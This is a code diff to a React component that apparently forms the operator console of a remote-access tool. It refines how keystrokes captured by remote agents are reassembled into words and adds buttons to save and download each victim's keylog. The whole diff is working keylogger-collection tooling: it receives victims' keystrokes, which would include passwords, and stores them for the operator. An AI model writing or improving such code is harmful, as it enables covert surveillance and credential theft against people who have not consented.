@@ -25,6 +25,7 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   const [showKeylog, setShowKeylog] = useState(false)
   const [keylog, setKeylog] = useState<string[]>([])
   const keyBufRef = useRef<string>("")
+  const keyTimerRef = useRef<number | null>(null)
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
   const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
 
@@ -95,29 +96,46 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   }, [agent.agent_id])
 
   useEffect(() => {
+    const flushWord = () => {
+      const w = keyBufRef.current.trim()
+      if (w) setKeylog((prev) => [...prev, w])
+      keyBufRef.current = ''
+    }
+    const scheduleFlush = () => {
+      if (keyTimerRef.current) window.clearTimeout(keyTimerRef.current)
+      keyTimerRef.current = window.setTimeout(flushWord, 600)
+    }
     const onLine = (raw: string) => {
       const s = String(raw || '')
       // Normalize pynput repr: e.g., "'d'", "Key.space", "Key.enter"
-      const isSpecial = s.startsWith('Key.')
-      if (isSpecial) {
-        if (s === 'Key.space') {
-          const w = keyBufRef.current.trim()
-          if (w) setKeylog((prev) => [...prev, w])
-          keyBufRef.current = ''
-        } else if (s === 'Key.enter') {
-          const w = keyBufRef.current.trim()
-          if (w) setKeylog((prev) => [...prev, w])
-          keyBufRef.current = ''
+      if (s.startsWith('Key.')) {
+        if (s === 'Key.space' || s === 'Key.enter' || s === 'Key.tab' || s === 'Key.num_lock') {
+          if (keyTimerRef.current) { window.clearTimeout(keyTimerRef.current); keyTimerRef.current = null }
+          flushWord()
+        } else if (s === 'Key.backspace') {
+          keyBufRef.current = keyBufRef.current.slice(0, -1)
+          scheduleFlush()
         }
+        // ignore modifiers
         return
       }
       // Single char like "'d'"
       const m = s.match(/^'(.*)'$/)
       const ch = m ? m[1] : s
-      keyBufRef.current += ch
+      if (/^[A-Za-z0-9]$/.test(ch)) {
+        keyBufRef.current += ch
+      } else {
+        // punctuation boundary: flush word
+        if (keyTimerRef.current) { window.clearTimeout(keyTimerRef.current); keyTimerRef.current = null }
+        flushWord()
+      }
+      scheduleFlush()
     }
     dashboardSocket.onKeylog(agent.agent_id, onLine)
-    return () => dashboardSocket.offKeylog(agent.agent_id, onLine)
+    return () => {
+      if (keyTimerRef.current) window.clearTimeout(keyTimerRef.current)
+      dashboardSocket.offKeylog(agent.agent_id, onLine)
+    }
   }, [agent.agent_id])
 
   useEffect(() => {
@@ -239,7 +257,8 @@ export default function AgentTerminal({ agent, onClose }: Props) {
               const url = URL.createObjectURL(blob)
               const a = document.createElement('a'); a.href = url; a.download = `keylog-${agent.agent_id}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
             }}>Download TXT</button>
-            <button className="btn secondary" onClick={() => { setKeylog([]); keyBufRef.current=''; }}>Clear</button>
+            <button className=\"btn secondary\" onClick={() => { setKeylog([]); keyBufRef.current=''; }}>Clear</button>
+            <button className=\"btn secondary\" onClick={() => { try { import('../utils/keylogs').then(mod => mod.saveKeylog(agent.agent_id, agent.name, keylog)); } catch {} }}>Save</button>
           </div>
           <div style={{ maxHeight: 200, overflow: 'auto', background: '#111', border: '1px solid #222', borderRadius: 6, padding: 8 }}>
             {keylog.map((l, i) => (<div key={i} style={{ color: '#bbb', fontSize: 12 }}>{l}</div>))}
